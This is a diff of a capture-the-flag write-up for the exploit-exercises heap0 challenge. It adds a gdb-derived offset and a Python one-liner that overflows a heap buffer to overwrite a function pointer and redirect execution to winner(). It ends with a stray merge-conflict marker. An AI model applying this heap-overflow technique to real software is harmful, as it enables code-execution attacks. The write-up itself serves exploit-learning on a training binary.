@@ -1444,7 +1444,7 @@ gdb$ x/20wx $eax                                #check out our heap
 0x804a048:      0x00000000      0x00000011      0x08048478      0x00000000
                                                     ^----- our target to overwrite (*fp)
 ```
-So now we just need to overflow our heap chunk to overwrite fp
+So now we just need to overflow our heap chunk to overwrite fp. Lets start by finding the offset.
 
 ```bash
 gdb$ x $esp+0x1c
@@ -1455,15 +1455,16 @@ gdb$ p 0x0804a050-$eax
 $4 = 0x48             <--- offset!
 gdb$ 
 ```
-tbc
+Now we can throw together a python one liner to overflow fp with the address of  to winner()
+```python           <offset>      <newtarget> 
+python -c "print 'a'*0x48 + '\x64\x84\x04\x08' "
+```
 
 ###winning command:
 ```bash
 ./heap0 $(python -c "print 'a'*0x48+'\x64\x84\x04\x08'")
 ```
-###Python exploit:
-```Python
-```
+
 =======
 exploit exercises write ups
 >>>>>>> 05dc9f8578d356a0aeb574c41e0e0d686bfbd10e
